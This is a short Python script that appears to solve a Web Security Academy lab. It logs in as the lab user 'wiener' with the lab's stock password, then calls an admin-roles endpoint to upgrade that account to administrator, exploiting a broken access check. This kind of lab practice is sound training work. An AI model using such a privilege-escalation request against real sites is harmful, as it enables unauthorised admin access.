import requests
s = requests.Session()

site = 'ac151f771e56e447c0ad1385008e0004.web-security-academy.net'
admin_url = f'https://{site}/admin-roles?username=wiener&action=upgrade'
login_url = f'https://{site}/login'

login_data = {
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)
resp = s.get(admin_url)
print(resp.status_code)
print(resp.text)